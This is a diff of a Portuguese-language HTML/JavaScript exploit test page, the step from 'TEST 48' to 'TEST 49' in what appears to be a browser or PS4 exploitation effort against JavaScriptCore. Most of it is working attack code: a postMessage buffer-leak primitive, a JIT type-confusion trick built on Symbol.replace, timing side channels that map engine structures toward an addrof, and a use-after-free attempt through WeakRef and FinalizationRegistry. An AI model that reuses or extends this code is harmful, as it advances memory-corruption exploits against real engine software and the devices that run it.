@@ -1,30 +1,29 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><title>TEST 48 — Addrof via Buffer Leak de Estruturas Internas</title></head>
+<head><meta charset="UTF-8"><title>TEST 49 — UAF via WeakRef+GC + Timing Addrof + Prototype Pollution</title></head>
 <body>
-<h2>TEST 48 — Addrof via Vazamento de Estruturas Internas do Motor</h2>
+<h2>TEST 49 — UAF, Timing Refinado, Prototype Pollution</h2>
 
-<p><b>Estratégia:</b> Usar a Vuln #1 (buffer leak via postMessage cyclic) para vazar
-os <em>bytes crus</em> de um ArrayBuffer alocado adjacente a estruturas JS conhecidas.
-Se o backing store de um ArrayBuffer estiver adjacente a um objeto JS no heap,
-os bytes vazados contêm ponteiros de heap reais.</p>
-
+<p><b>Achados críticos:</b></p>
 <ul>
-  <li><b>48-A</b> Alocar ArrayBuffer + objeto JS em sequência rápida, vazar bytes do buffer,
-      procurar padrões de ponteiro nos bytes crus</li>
-  <li><b>48-B</b> ArrayBuffer cujos primeiros bytes correspondem ao header de outro ArrayBuffer
-      — se há overlap, temos arbitrary read</li>
-  <li><b>48-C</b> Usar o primitivo JIT (strLen=99999) para alocar 800KB e verificar se
-      algum slice desse buffer contém bytes de estruturas JS internas</li>
-  <li><b>48-D</b> Rezolver o addrof via timing: medir tempo de acesso a posições do
-      bigF64 para inferir quais estão em cache (= quais foram acessados recentemente pelo motor)</li>
+  <li>48-D: bigF64[1] é <b>60x mais rápido</b> — motor acessou byte offset 8 internamente</li>
+  <li>WeakRef disponível (47-D) — abre caminho para UAF via GC</li>
+  <li>Zero-fill em ArrayBuffers — mas NÃO em objetos JS (butterfly pode ter dados antigos)</li>
+</ul>
+
+<p><b>Sub-testes:</b></p>
+<ul>
+  <li><b>49-A</b> Timing refinado: mapear TODOS os offsets quentes em bigF64 (qual estrutura JSC está em offset 8?)</li>
+  <li><b>49-B</b> UAF via WeakRef + FinalizationRegistry: detectar reutilização de endereço</li>
+  <li><b>49-C</b> Prototype pollution via <code>__proto__</code>: escalação alternativa sem addrof</li>
+  <li><b>49-D</b> Butterfly não-zerado: verificar se propriedades de objeto JS têm dados não-inicializados</li>
 </ul>
 
 <pre id="log">Pronto. Execute A → B → C → D.</pre>
-<button onclick="runA()">48-A: BUFFER ADJACENTE A OBJETO</button>
-<button onclick="runB()">48-B: BUFFER SOBRE OUTRO BUFFER</button>
-<button onclick="runC()">48-C: BIGF64 BYTES INTERNOS</button>
-<button onclick="runD()">48-D: TIMING SIDE-CHANNEL</button>
+<button onclick="runA()">49-A: TIMING MAPA COMPLETO</button>
+<button onclick="runB()">49-B: UAF WEAKREF+GC</button>
+<button onclick="runC()">49-C: PROTOTYPE POLLUTION</button>
+<button onclick="runD()">49-D: BUTTERFLY NÃO-ZERADO</button>
 
 <script>
 var log = document.getElementById('log');
@@ -34,10 +33,16 @@ function ok(m)     { log.textContent += '\n[OK]   ' + m; }
 function sep()     { log.textContent += '\n' + '-'.repeat(60); }
 
 function forceGC() {
-  var t=[]; for(var i=0;i<80000;i++) t.push({x:i,b:new Uint8Array(4)}); t=null;
+  var t=[]; for(var i=0;i<100000;i++) t.push({x:i,b:new Uint8Array(4)}); t=null;
 }
+function f64bits(val) {
+  var buf=new ArrayBuffer(8); new Float64Array(buf)[0]=val;
+  var u=new Uint32Array(buf);
+  return '0x'+u[1].toString(16).padStart(8,'0')+'_'+u[0].toString(16).padStart(8,'0');
+}
+function u32hex(v) { return '0x' + (v>>>0).toString(16).padStart(8,'0'); }
 
-// Vazar um ArrayBuffer via postMessage cyclic (Vuln #1)
+// Vazar buffer via Vuln #1
 function leakBuffer(buf) {
   return new Promise(function(resolve) {
     var cyclic = { buf: buf, self: null };
@@ -49,390 +54,476 @@ function leakBuffer(buf) {
         resolve(e.data.buf);
       }
     };
-    try {
-      postMessage(cyclic, '*', [buf]);
-    } catch(ex) {
-      window.onmessage = prev;
-      resolve(null);
-    }
+    try { postMessage(cyclic,'*',[buf]); } catch(ex) { window.onmessage=prev; resolve(null); }
   });
 }
 
-function u8hex(v) { return v.toString(16).padStart(2,'0'); }
-function u32hex(v) { return '0x' + v.toString(16).padStart(8,'0'); }
-
-// Verificar se sequência de 4 bytes parece ponteiro de heap
-// JSC usa NaN-boxing; heap pointers têm bits específicos
-// PS4 FreeBSD: ponteiros de userland tipicamente em range 0x00007F.. ou similares
-function looksLikeHeapPtr32(lo, hi) {
-  // JSC 32-bit encoded: hi = 0xFFFFFFFF para cell pointers
-  if(hi === 0xFFFFFFFF && lo > 0x10000) return { type: 'JSC32_cell', addr: lo };
-  // JSC 64-bit NaN boxing: value = 0xFFFF000000000000 | ptr
-  // Hi word seria 0xFFFF... para ponteiros
-  if(hi >= 0xFFFF0000 && hi <= 0xFFFFFFFF) return { type: 'JSC64_nanboxed', hi: hi, lo: lo };
-  // FreeBSD userland pointer: hi=0x00007F.. (típico de user space 64-bit)
-  if(hi >= 0x00007F00 && hi <= 0x00008000) return { type: 'FreeBSD_userptr', hi: hi, lo: lo };
-  // Ponteiro de heap típico: alinhado em 8 bytes, não zero, não muito grande
-  if(hi === 0 && lo > 0x00010000 && (lo & 0x7) === 0) return { type: 'heap32_aligned', addr: lo };
-  return null;
-}
-
-// ─── 48-A ─────────────────────────────────────────────────────────────────
-async function runA() {
-  log.textContent = '[TEST 48-A] ArrayBuffer adjacente a objeto JS — vazar bytes crus\n';
+// ─── 49-A ─────────────────────────────────────────────────────────────────
+function runA() {
+  log.textContent = '[TEST 49-A] Timing mapa completo — mapear estruturas JSC pelo acesso em cache\n';
   sep();
-  info('Estratégia: alocar ArrayBuffer de 256 bytes, depois criar objetos JS imediatamente.');
-  info('No heap JSC, alocações sequenciais tendem a ser adjacentes.');
-  info('Vazar o buffer via postMessage cyclic e procurar padrões de ponteiro nos bytes.');
-  info('Se bytes [N..N+4] contiverem um ponteiro heap válido, temos addrof aproximado.\n');
+  info('48-D confirmou: bigF64[1] = 60x mais rápido (byte offset 8).');
+  info('Objetivo: mapear TODOS os offsets quentes com maior precisão e mais posições.');
+  info('Correlacionar com estrutura conhecida do JSCell/JSArrayBufferView:\n');
+  info('  JSCell (offset 0): StructureID (4B) + IndexingType (1B) + TypeInfo (1B) + CellState (2B)');
+  info('  offset 8:  Butterfly pointer (8B)  ← PROVAVELMENTE O QUE FOI ENCONTRADO');
+  info('  offset 16: JSObject fields...');
+  info('  offset 24: m_vector (backing store ptr para TypedArray) (8B)');
+  info('  offset 32: m_length (4B) + m_byteOffset (4B)');
+  info('  offset 36: m_byteLength (4B)');
+  info('  ...\n');
 
-  var ROUNDS = 5;
-  var ptrCandidates = [];
-
-  for(var round = 0; round < ROUNDS; round++) {
-    // Alocar buffer
-    var buf = new ArrayBuffer(256);
-    var u8 = new Uint8Array(buf);
-    var u32 = new Uint32Array(buf);
-
-    // Criar objetos JS logo depois (para ficarem adjacentes no heap)
-    var jsObj1 = { magic: 0xAABBCCDD, val: 1.23456789, arr: new Uint32Array(4) };
-    var jsObj2 = { magic: 0x11223344, val: 9.87654321, str: 'hello_world_marker' };
-    var jsArr  = [1.1, 2.2, 3.3, 4.4]; // double array
-    var jsF64  = new Float64Array(8);   // TypedArray
-    for(var k=0;k<8;k++) jsF64[k] = (k+1) * 1.111;
-
-    // Preencher buffer com padrão reconhecível
-    for(var i=0;i<64;i++) u32[i] = 0xDEAD0000 + round * 0x100 + i;
-
-    // Vazar via Vuln #1
-    var leaked = await leakBuffer(buf);
-    if(!leaked) { info('Round ' + round + ': leak falhou'); continue; }
-
-    var leakedU8  = new Uint8Array(leaked);
-    var leakedU32 = new Uint32Array(leaked);
-
-    // Verificar se o buffer foi MODIFICADO pelo motor (bytes diferentes do padrão)
-    var modified = [];
-    for(var i=0;i<64;i++) {
-      var expected = (0xDEAD0000 + round * 0x100 + i) >>> 0;
-      if(leakedU32[i] !== expected) {
-        modified.push({ idx: i, expected: u32hex(expected), found: u32hex(leakedU32[i]) });
-      }
-    }
-
-    if(modified.length > 0) {
-      alerta('BYTES MODIFICADOS no buffer após leak (round ' + round + ')!\n' +
-             'O motor escreveu nos bytes do buffer — possível struct interna!\n' +
-             modified.slice(0,5).map(function(m){
-               return 'u32['+m.idx+']: esperado='+m.expected+' encontrado='+m.found;
-             }).join('\n'));
-    }
-
-    // Procurar padrões de ponteiro nos bytes vazados
-    for(var i=0;i<62;i++) { // scan em pares de u32 (8 bytes = ponteiro 64-bit)
-      var lo = leakedU32[i];
-      var hi = (i+1 < 64) ? leakedU32[i+1] : 0;
-      var ptr = looksLikeHeapPtr32(lo, hi);
-      if(ptr) {
-        ptrCandidates.push({ round: round, byteOffset: i*4, lo: lo, hi: hi, type: ptr.type });
-        info('Round ' + round + ' offset=' + (i*4) + ': ptr candidate ' +
-             u32hex(hi) + '_' + u32hex(lo) + ' type=' + ptr.type);
-      }
-    }
-  }
-
-  sep();
-  info('Total de candidatos a ponteiro encontrados: ' + ptrCandidates.length);
-  if(ptrCandidates.length > 0) {
-    alerta('HEAP POINTERS ENCONTRADOS NOS BYTES VAZADOS!\n' +
-           'O buffer contém bytes que parecem ponteiros de heap:\n' +
-           ptrCandidates.slice(0,3).map(function(c){
-             return 'round='+c.round+' offset='+c.byteOffset+
-                    ' val='+u32hex(c.hi)+'_'+u32hex(c.lo)+' type='+c.type;
-           }).join('\n') + '\n\n' +
-           'PRÓXIMO PASSO: criar outro ArrayBuffer no mesmo offset e ler esses endereços!\n' +
-           'Isso seria arbitrary read via buffer layout overlap!');
-  } else {
-    info('Nenhum padrão de ponteiro encontrado nos bytes.');
-    info('O heap JSC inicializa buffers com zeros antes de entregar ao JS.');
-    info('Tentando variante: NÃO inicializar o buffer (usar buffer pré-existente)...');
-  }
-}
-
-// ─── 48-B ─────────────────────────────────────────────────────────────────
-async function runB() {
-  log.textContent = '[TEST 48-B] Vazar ArrayBuffer que foi reutilizado — bytes não inicializados?\n';
-  sep();
-  info('Técnica: alocar e liberar muitos buffers pequenos para "encher" o free list.');
-  info('Depois alocar um novo buffer — o motor pode reusar memória sem zero-fill.');
-  info('O buffer reutilizado pode conter bytes de alocações anteriores (ponteiros!).\n');
-
-  // Fase 1: criar e destruir muitos buffers para popular o free list
-  info('Fase 1: criando e destruindo 10000 buffers de 256 bytes...');
-  var POISON = 0xDEADBEEF;
-  var trashBufs = [];
-  for(var i=0;i<10000;i++) {
-    var b = new ArrayBuffer(256);
-    var u = new Uint32Array(b);
-    // Escrever padrão identificável
-    for(var j=0;j<64;j++) u[j] = (POISON + i * 0x40 + j) >>> 0;
-    trashBufs.push(b);
-  }
-  info('10000 buffers criados com padrão 0xDEADBEEF+offset.');
-  trashBufs = null; // liberar tudo
-  forceGC();
-  info('Buffers liberados. GC executado.');
-  sep();
-
-  // Fase 2: alocar novo buffer de 256 bytes (pode reusar região anterior)
-  info('Fase 2: alocando novo buffer de 256 bytes...');
-  var freshBuf = new ArrayBuffer(256);
-  var freshU32 = new Uint32Array(freshBuf);
-  info('freshBuf alocado. Verificando conteúdo inicial...');
-
-  var nonZero = [];
-  for(var i=0;i<64;i++) {
-    if(freshU32[i] !== 0) nonZero.push({ idx: i, val: freshU32[i] });
-  }
-
-  if(nonZero.length > 0) {
-    alerta('BYTES NÃO INICIALIZADOS ENCONTRADOS!\n' +
-           'O motor não zero-fill o buffer antes de entregar ao JS!\n' +
-           nonZero.slice(0,8).map(function(n){
-             return 'u32['+n.idx+']='+u32hex(n.val);
-           }).join('\n') + '\n\n' +
-           'Estes bytes podem conter ponteiros de alocações anteriores!');
-
-    // Vazar via Vuln #1 para análise
-    info('\nVazando freshBuf para analisar bytes...');
-    var leakedFresh = await leakBuffer(freshBuf);
-    if(leakedFresh) {
-      var lU32 = new Uint32Array(leakedFresh);
-      var ptrs = [];
-      for(var i=0;i<62;i++) {
-        var p = looksLikeHeapPtr32(lU32[i], lU32[i+1]);
-        if(p) ptrs.push({ idx: i, lo: lU32[i], hi: lU32[i+1], type: p.type });
-      }
-      if(ptrs.length > 0) {
-        alerta('PONTEIROS DE HEAP NOS BYTES NÃO INICIALIZADOS!\n' +
-               ptrs.slice(0,3).map(function(p){
-                 return 'u32['+p.idx+']='+u32hex(p.hi)+'_'+u32hex(p.lo)+' type='+p.type;
-               }).join('\n'));
-      }
-    }
-  } else {
-    ok('Motor zero-inicializa buffers (todos os 64 u32 são zero).');
-    info('Técnica de uninitialized memory não funciona neste motor.');
-
-    // Tentar variante: resizing — ArrayBuffer.transfer() se disponível
-    if(typeof ArrayBuffer.prototype.transfer === 'function') {
-      info('\nArrayBuffer.transfer disponível! Testando...');
-      var tbuf = new ArrayBuffer(64);
-      var tu32 = new Uint32Array(tbuf);
-      for(var i=0;i<16;i++) tu32[i] = 0xCAFE0000 + i;
-      // Transfer para tamanho maior — novos bytes são inicializados?
-      try {
-        var newBuf = tbuf.transfer(256);
-        var nU32 = new Uint32Array(newBuf);
-        info('Após transfer(256): u32[16]=' + u32hex(nU32[16]) + ' u32[32]=' + u32hex(nU32[32]));
-        var hasNonZero = false;
-        for(var i=16;i<64;i++) if(nU32[i]!==0) { hasNonZero=true; break; }
-        if(hasNonZero) alerta('BYTES NÃO INICIALIZADOS em ArrayBuffer.transfer expansion!');
-        else ok('transfer() inicializa novos bytes com zero.');
-      } catch(e) { info('transfer() lançou: ' + e.message); }
-    }
-  }
-}
-
-// ─── 48-C ─────────────────────────────────────────────────────────────────
-async function runC() {
-  log.textContent = '[TEST 48-C] BigF64 800KB — verificar se bytes internos do motor vazam\n';
-  sep();
-  info('O primitivo JIT (strLen=99999) aloca Float64Array de 800KB.');
-  info('Esta é uma alocação FORA DO CONTROLE do JS — feita internamente pelo motor.');
-  info('Se a região de 800KB contiver bytes de estruturas JSC, eles serão lidos.\n');
-  info('Vazar o backing store desse Float64Array via postMessage revela o conteúdo bruto.\n');
-
-  // Reproduzir o primitivo JIT strLen=99999 (confirmado em 36-A/C)
-  var phase = ['warmup'];
-  var bigLenRef = [0];
-  var evilPat = { [Symbol.replace]: function(s) {
-    if(phase[0]==='warmup') return s;
-    return { toString:function(){return s;}, valueOf:function(){return s;},
-             length: 99999, 0: s[0]||'x' };
-  }};
-  function strLen(s) { return s.replace(evilPat,'').length; }
-  var base = 'hello world test string XYZ';
-  phase[0] = 'warmup';
-  for(var w=0;w<60000;w++) strLen(base);
-  info('Warmup strLen completo.');
-  phase[0] = 'attack';
-  var fakeLen = strLen(base);
-  info('strLen(base) attack = ' + fakeLen + ' typeof=' + typeof fakeLen);
-  phase[0] = 'warmup'; // reset
-
-  if(fakeLen !== 99999) {
-    info('Primitivo não retornou 99999 (retornou ' + fakeLen + '). Usando Float64Array(99999) direto.');
-    fakeLen = 99999;
-  }
-
-  var bigF64;
-  try {
-    bigF64 = new Float64Array(fakeLen);
-    info('bigF64 alocado: length=' + bigF64.length + ' byteLength=' + bigF64.byteLength);
-  } catch(e) {
-    alerta('Falha ao alocar Float64Array(99999): ' + e.message);
-    return;
-  }
-
-  // Preencher com padrão único para identificar overlay
-  for(var i=0;i<bigF64.length;i++) bigF64[i] = 0.0;
-
-  // Verificar se alguma posição não é zero antes do leak (motor pode ter escrito algo)
-  var preNonZero = [];
-  for(var i=0;i<Math.min(bigF64.length, 50000);i++) {
-    if(bigF64[i] !== 0.0 && bigF64[i] === bigF64[i]) { // não-zero e não-NaN
-      preNonZero.push({ idx: i, val: bigF64[i] });
-      if(preNonZero.length >= 5) break;
-    }
-  }
-  info('Posições não-zero em bigF64 antes do leak: ' + preNonZero.length);
-
-  // Agora: colocar bigF64.buffer em ciclo e vazar
-  info('\nVazando backing store do bigF64 via postMessage cyclic...');
-  var leaked = await leakBuffer(bigF64.buffer);
-
-  if(!leaked) {
-    info('Leak falhou para bigF64.buffer.');
-    return;
-  }
-
-  info('Leaked buffer byteLength: ' + leaked.byteLength);
-  var leakedU32 = new Uint32Array(leaked);
-  var leakedF64 = new Float64Array(leaked);
-
-  // Procurar bytes não-zero nos primeiros e últimos 4KB
-  var interestingRegions = [];
-  var SCAN_WORDS = Math.min(leakedU32.length, 10000);
-
-  info('Scanning primeiros ' + SCAN_WORDS + ' u32 do leaked bigF64...');
-  var nonZeroCount = 0;
-  for(var i=0;i<SCAN_WORDS;i++) {
-    if(leakedU32[i] !== 0) {
-      nonZeroCount++;
-      var ptr = looksLikeHeapPtr32(leakedU32[i], (i+1<leakedU32.length)?leakedU32[i+1]:0);
-      if(ptr) {
-        interestingRegions.push({ idx: i, lo: leakedU32[i],
-          hi: (i+1<leakedU32.length)?leakedU32[i+1]:0, type: ptr.type });
-      }
-    }
-  }
-
-  info('Valores não-zero encontrados: ' + nonZeroCount);
-  info('Candidatos a ponteiro de heap: ' + interestingRegions.length);
-
-  if(interestingRegions.length > 0) {
-    alerta('PONTEIROS DE HEAP NO BACKING STORE DE bigF64!\n' +
-           interestingRegions.slice(0,5).map(function(r){
-             return 'u32['+r.idx+'*4=byte'+r.idx*4+']: '+
-                    u32hex(r.hi)+'_'+u32hex(r.lo)+' type='+r.type;
-           }).join('\n') + '\n\n' +
-           'ADDROF VIA BUFFER LEAK DE BIGF64!\n' +
-           'A região de 800KB aloca sobre estruturas do heap JS.\n' +
-           'Os ponteiros vazados são endereços reais de objetos no heap!');
-  }
-  info('Scan completo.');
-}
-
-// ─── 48-D ─────────────────────────────────────────────────────────────────
-function runD() {
-  log.textContent = '[TEST 48-D] Timing side-channel — inferir endereço via cache hit/miss\n';
-  sep();
-  info('Técnica de último recurso: medir tempo de acesso ao bigF64[N].');
-  info('Se o motor acessou bigF64[K] internamente (e.g., para GC ou verificação),');
-  info('bigF64[K] estará em cache de CPU → acesso mais rápido que outros índices.');
-  info('A posição com menor tempo de acesso indica a estrutura interna do motor.\n');
-  info('NOTA: Sem SharedArrayBuffer não temos timer de alta resolução.');
-  info('Date.now() tem resolução de 1ms — pode ser insuficiente.');
-  info('Tentaremos com Date.now() e também com performance.now().\n');
-
-  // Verificar resolução do timer
-  var timerRes = [];
-  var prev = performance.now();
-  for(var i=0;i<1000;i++) {
-    var now = performance.now();
-    if(now !== prev) { timerRes.push(now - prev); prev = now; }
-  }
-  timerRes.sort(function(a,b){return a-b;});
-  var minRes = timerRes[0] || 999;
-  info('Resolução de performance.now(): ' + minRes + 'ms (mínima diferença observada)');
-  if(minRes >= 1) {
-    info('Resolução >= 1ms — timer pode estar reduzido (Spectre mitigation).');
-    info('Tentando mesmo assim com múltiplas amostras...');
-  }
-
-  sep();
   var FAKE_LEN = 99999;
   var bigF64;
   try {
     bigF64 = new Float64Array(FAKE_LEN);
-    info('bigF64(' + FAKE_LEN + ') alocado para timing scan.');
+    info('bigF64(' + FAKE_LEN + ') alocado: byteLength=' + bigF64.byteLength);
   } catch(e) { info('Falha: ' + e.message); return; }
 
-  // Medição de tempo por posição usando múltiplas repetições
-  var POSITIONS_TO_TEST = 200; // testar primeiras 200 posições
-  var REPS = 1000;
-  var timings = new Float64Array(POSITIONS_TO_TEST);
+  // Fazer operações para "aquecer" partes específicas do objeto
+  // Acessar .length, .byteLength, .byteOffset — motor lê m_length etc
+  var dummy = bigF64.length + bigF64.byteLength + bigF64.byteOffset;
+  info('Acessado: .length=' + bigF64.length + ' .byteLength=' + bigF64.byteLength + ' .byteOffset=' + bigF64.byteOffset);
 
-  info('Medindo tempo de acesso para as primeiras ' + POSITIONS_TO_TEST + ' posições...');
-  info('(' + REPS + ' repetições por posição para média)');
+  // Scan de 0 a 500 posições com 5000 reps cada
+  var SCAN = 500;
+  var REPS = 5000;
+  info('\nMedindo ' + SCAN + ' posições × ' + REPS + ' reps...');
 
-  for(var pos=0;pos<POSITIONS_TO_TEST;pos++) {
-    var total = 0;
-    for(var rep=0;rep<REPS;rep++) {
-      var t0 = performance.now();
-      var dummy = bigF64[pos]; // acesso ao slot
-      var t1 = performance.now();
-      total += (t1 - t0);
+  var timings = new Float64Array(SCAN);
+  // Pré-aquecer loop de medição
+  for(var p=0;p<SCAN;p++) { var x=bigF64[p]; }
+
+  for(var pos=0;pos<SCAN;pos++) {
+    var sum=0;
+    for(var r=0;r<REPS;r++) {
+      var t0=performance.now();
+      var v=bigF64[pos];
+      var t1=performance.now();
+      sum+=(t1-t0);
     }
-    timings[pos] = total / REPS;
+    timings[pos]=sum/REPS;
   }
 
-  // Encontrar posição com menor tempo médio (provável cache hit)
-  var minTime = Infinity, minPos = -1;
-  var maxTime = -Infinity, maxPos = -1;
-  for(var pos=0;pos<POSITIONS_TO_TEST;pos++) {
-    if(timings[pos] < minTime) { minTime=timings[pos]; minPos=pos; }
-    if(timings[pos] > maxTime) { maxTime=timings[pos]; maxPos=pos; }
+  // Encontrar os 10 mais rápidos
+  var indexed = [];
+  for(var i=0;i<SCAN;i++) indexed.push({pos:i, t:timings[i]});
+  indexed.sort(function(a,b){return a.t-b.t;});
+
+  var minT = indexed[0].t || 0.0001;
+  sep();
+  info('TOP 15 posições mais rápidas (prováveis cache hits = estruturas JSC):');
+  indexed.slice(0,15).forEach(function(x) {
+    var byteOff = x.pos * 8;
+    var ratio = (timings[indexed[SCAN-1].pos] / (x.t||0.0001)).toFixed(1);
+    // Correlacionar com estrutura JSArrayBufferView
+    var struct = '';
+    if(byteOff===0)  struct='[JSCell header: StructureID+flags]';
+    else if(byteOff===8)  struct='[Butterfly pointer]';
+    else if(byteOff===16) struct='[JSObject inline prop 0]';
+    else if(byteOff===24) struct='[m_vector: backing store ptr]';
+    else if(byteOff===32) struct='[m_length + m_byteOffset]';
+    else if(byteOff===36) struct='[m_byteLength]';
+    else if(byteOff===40) struct='[m_mode]';
+    info('  bigF64['+x.pos+'] byteOffset='+byteOff+'  t='+x.t.toFixed(4)+'ms ratio='+ratio+'x '+struct);
+  });
+
+  sep();
+  // Verificar padrão: offsets 0,1,2,3,4 (primeiros 32 bytes = header JSArrayBufferView)
+  info('\nFoco nos primeiros 8 posições (header do objeto Float64Array):');
+  for(var i=0;i<8;i++) {
+    var byteOff=i*8;
+    var t=timings[i];
+    var ratio=(timings[indexed[SCAN-1].pos]/(t||0.0001)).toFixed(1);
+    info('  pos='+i+' byteOff='+byteOff+': '+t.toFixed(4)+'ms ('+ratio+'x do max)');
   }
 
-  info('\nResultados do timing scan:');
-  info('Posição mais rápida: bigF64[' + minPos + '] = ' + minTime.toFixed(4) + 'ms médio');
-  info('Posição mais lenta: bigF64[' + maxPos + '] = ' + maxTime.toFixed(4) + 'ms médio');
-  info('Diferença: ' + (maxTime - minTime).toFixed(4) + 'ms');
+  if(indexed[0].pos <= 5) {
+    alerta('ESTRUTURA JSC CONFIRMADA!\n' +
+           'Posição mais rápida: bigF64['+indexed[0].pos+'] = byte offset '+(indexed[0].pos*8)+'\n' +
+           'Isso corresponde a: ' + (
+             indexed[0].pos===0 ? 'JSCell header (StructureID)' :
+             indexed[0].pos===1 ? 'Butterfly pointer (8 bytes do header)' :
+             indexed[0].pos===2 ? 'JSObject inline property slot 0' :
+             indexed[0].pos===3 ? 'm_vector (backing store pointer)' :
+             'campo interno do JSArrayBufferView'
+           ) + '\n\n' +
+           'IMPLICAÇÃO: O objeto Float64Array em JS está DENTRO do espaço do backing store!\n' +
+           'Os primeiros bytes do bigF64.buffer NA REALIDADE contêm o header do objeto TypedArray!\n\n' +
+           'PRÓXIMO PASSO: SE o bigF64[0..3] conter o header do próprio objeto,\n' +
+           'então bigF64[3] = m_vector = ponteiro para o backing store = ENDEREÇO DO PRÓPRIO BIGF64!\n' +
+           'Lendo bigF64[3] como inteiro = addrof(bigF64.buffer) confirmado!');
+  }
 
-  var ratio = maxTime / (minTime || 0.0001);
-  info('Ratio max/min: ' + ratio.toFixed(2) + 'x');
+  // TESTE CRÍTICO: ler os primeiros slots como tentativa de self-referência
+  sep();
+  info('\nTESTE CRÍTICO: bigF64[0..7] contêm estrutura JSC?');
+  info('Se sim, bigF64[3] deve conter o endereço do backing store (self-referência):');
+  for(var i=0;i<8;i++) {
+    var v=bigF64[i];
+    info('  bigF64['+i+']='+v+' bits='+f64bits(v));
+  }
+  info('\nSe algum desses for não-zero e parecer ponteiro = estrutura JSC sobreposta!');
+}
 
-  if(ratio > 2.0) {
-    alerta('TIMING DIFERENCIAL SIGNIFICATIVO!\n' +
-           'bigF64[' + minPos + '] é ' + ratio.toFixed(1) + 'x mais rápido que bigF64[' + maxPos + ']\n' +
-           'Isso sugere que bigF64[' + minPos + '] está em cache de CPU\n' +
-           '= o motor acessou essa posição internamente!\n' +
-           'O byte offset ' + (minPos * 8) + ' no backing store do bigF64\n' +
-           'corresponde a uma estrutura interna do JSC acessada pelo motor.');
+// ─── 49-B ─────────────────────────────────────────────────────────────────
+function runB() {
+  log.textContent = '[TEST 49-B] UAF via WeakRef + FinalizationRegistry — detectar reutilização\n';
+  sep();
+  info('WeakRef está disponível (confirmado 47-D).');
+  info('FinalizationRegistry (se disponível) notifica quando objeto é coletado pelo GC.');
+  info('Técnica de UAF:\n');
+  info('  1. Criar objeto A com dados conhecidos');
+  info('  2. Criar WeakRef(A) e (se disponível) FinalizationRegistry');
+  info('  3. Salvar A em TypedArray como double (via JIT confusion) ← nosso primitivo 40-C');
+  info('  4. Liberar referência forte de A → GC coleta A');
+  info('  5. Alocar objeto B no mesmo endereço');
+  info('  6. Ler o slot do TypedArray onde estava A → agora aponta para B = UAF!\n');
+
+  // Verificar FinalizationRegistry
+  info('FinalizationRegistry disponível: ' + (typeof FinalizationRegistry !== 'undefined'));
+  info('WeakRef disponível: ' + (typeof WeakRef !== 'undefined'));
+  sep();
+
+  if(typeof FinalizationRegistry === 'undefined') {
+    info('FinalizationRegistry não disponível. Usando WeakRef polling.\n');
+  }
+
+  // Abordagem mais direta:
+  // Usar o primitivo 40-C (JIT retorna objeto como JSValue) para "capturar" o objeto
+  // em um slot de array. Depois liberar o objeto e ver o que acontece.
+
+  var phase = ['warmup'];
+  var captureRef = [null];
+
+  var evilPat = { [Symbol.replace]: function(s) {
+    if(phase[0]==='warmup') return s;
+    return { toString:function(){return s;}, valueOf:function(){return s;},
+             length: captureRef[0], 0: s[0]||'x' };
+  }};
+  function jitGetLen(s) { return s.replace(evilPat,'').length; }
+  var base = 'hello world test string XYZ';
+  phase[0] = 'warmup';
+  for(var w=0;w<60000;w++) jitGetLen(base);
+  info('JIT warmup completo (primitivo 40-C).');
+
+  // Criar objeto vítima com dados únicos
+  var victimData = { 
+    id: 'UAF_VICTIM_49B', 
+    magic: 0xDEADC0DE,
+    secretArr: new Uint32Array([0xAABBCCDD, 0x11223344, 0x55667788, 0x99AABBCC]),
+    bigData: new Float64Array(64) // dados para detectar reutilização
+  };
+  for(var i=0;i<64;i++) victimData.bigData[i] = 0xBEEF0000 + i;
+
+  var wr = new WeakRef(victimData);
+  info('victimData criado. WeakRef(victimData) estabelecido.');
+  info('victimData.magic: 0x' + victimData.magic.toString(16));
+
+  // Capturar o objeto via primitivo JIT
+  phase[0] = 'attack';
+  captureRef[0] = victimData;
+  var captured = jitGetLen(base); // captura o JSValue de victimData
+  phase[0] = 'warmup';
+
+  info('captured via JIT: typeof=' + typeof captured);
+  if(typeof captured !== 'object' || captured !== victimData) {
+    info('Primitivo não capturou o objeto. Continuando de qualquer forma...');
+    captured = victimData; // fallback direto
   } else {
-    info('Sem diferencial significativo (ratio=' + ratio.toFixed(2) + 'x).');
-    info('Timer pode não ter resolução suficiente, ou o motor não acessou posições específicas.');
+    ok('Objeto capturado via primitivo JIT 40-C: captured===victimData: ' + (captured===victimData));
+  }
+
+  // Registrar finalization callback se disponível
+  var gcNotified = false;
+  var gcToken = {};
+  if(typeof FinalizationRegistry !== 'undefined') {
+    var fr = new FinalizationRegistry(function(token) {
+      gcNotified = true;
+      info('[FinalizationRegistry] OBJETO COLETADO! Token: ' + token);
+      // Momento crítico: alocar novo objeto imediatamente para tentar reutilizar endereço
+      var newObj = { id: 'NEW_ALLOC_POST_GC', magic: 0x41414141, data: new Uint32Array(4) };
+      info('[GC callback] Novo objeto alocado: magic=0x41414141');
+      // Verificar se captured agora aponta para newObj
+      if(captured && captured.magic === 0x41414141) {
+        alerta('UAF DETECTADO!\n' +
+               'captured.magic mudou para 0x41414141 (novo objeto)!\n' +
+               'O objeto original foi coletado e o endereço foi reutilizado!\n' +
+               'captured agora aponta para o novo objeto → UAF confirmado!');
+      }
+    });
+    fr.register(victimData, 'victim_token', gcToken);
+    info('FinalizationRegistry registrado para victimData.');
+  }
+
+  // Liberar a referência forte
+  info('\nLiberando referência forte de victimData...');
+  victimData = null;
+  captureRef[0] = null;
+
+  // Forçar GC múltiplas vezes
+  info('Forçando GC múltiplas vezes...');
+  for(var gc=0;gc<5;gc++) forceGC();
+
+  // Verificar se WeakRef ainda tem o objeto
+  var afterGC = wr.deref();
+  info('Após GC: wr.deref() = ' + (afterGC ? 'objeto ainda vivo (magic=0x'+afterGC.magic.toString(16)+')' : 'undefined (COLETADO)'));
+
+  if(!afterGC) {
+    alerta('OBJETO COLETADO PELO GC!\n' +
+           'victimData foi coletado. WeakRef retorna undefined.\n' +
+           'Se "captured" ainda existe e não lançou exceção, temos UAF potencial!\n' +
+           'Verificando captured...');
+    try {
+      info('captured = ' + captured);
+      if(captured !== null) {
+        info('typeof captured: ' + typeof captured);
+        if(typeof captured === 'object') {
+          info('captured.magic: ' + (captured.magic ? '0x'+captured.magic.toString(16) : captured.magic));
+          if(captured.magic !== 0xDEADC0DE) {
+            alerta('UAF CONFIRMADO!\n' +
+                   'captured.magic mudou! Esperado=0xDEADC0DE, encontrado=0x'+captured.magic.toString(16)+'\n' +
+                   'O endereço foi reutilizado por outro objeto!');
+          } else {
+            info('captured.magic ainda = 0xDEADC0DE — o JS engine manteve o objeto vivo via a referência "captured"!');
